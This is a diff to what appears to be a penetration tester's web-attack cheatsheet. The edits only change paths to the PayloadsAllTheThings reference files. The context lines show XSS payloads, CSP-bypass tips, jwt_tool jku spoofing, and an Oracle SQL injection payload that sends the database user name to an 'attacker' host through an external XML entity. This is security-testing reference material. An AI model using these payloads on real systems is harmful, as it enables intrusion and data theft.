@@ -28,7 +28,7 @@ javascript:alert(1)
 #<img src=x onerror=alert(1)>
 ```
 
-CSP bypass: depends on policy. Look for `unsafe-inline`, JSONP endpoints in allowlist, base-uri tricks. Cheatsheet: `~/tools/PayloadsAllTheThings/XSS Injection/README.md`.
+CSP bypass: depends on policy. Look for `unsafe-inline`, JSONP endpoints in allowlist, base-uri tricks. Cheatsheet: `/opt/PayloadsAllTheThings/XSS Injection/README.md` (Termux: `~/tools/...`).
 
 ## SQLi
 
@@ -51,7 +51,7 @@ CSP bypass: depends on policy. Look for `unsafe-inline`, JSONP endpoints in allo
 1' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % a SYSTEM "http://attacker/'||user||'">%a;]>'),'/l') FROM dual-- -
 ```
 
-For complex cases use `sqlmap`. Cheatsheet: `~/tools/PayloadsAllTheThings/SQL Injection/`.
+For complex cases use `sqlmap`. Cheatsheet: `/opt/PayloadsAllTheThings/SQL Injection/` (Termux: `~/tools/...`).
 
 ## SSTI
 
@@ -183,4 +183,4 @@ jwt_tool $TOKEN -X jku             # jku spoofing
 
 ## When in doubt
 
-`~/tools/PayloadsAllTheThings/<vuln>/README.md` is the canonical cheatsheet — open that file. It updates faster than any inline list.
+`${GITHUB_TOOL_DIR:-/opt}/PayloadsAllTheThings/<vuln>/README.md` is the canonical cheatsheet — `/opt/...` on Linux, `~/tools/...` on Termux. Open that file; it updates faster than any inline list.
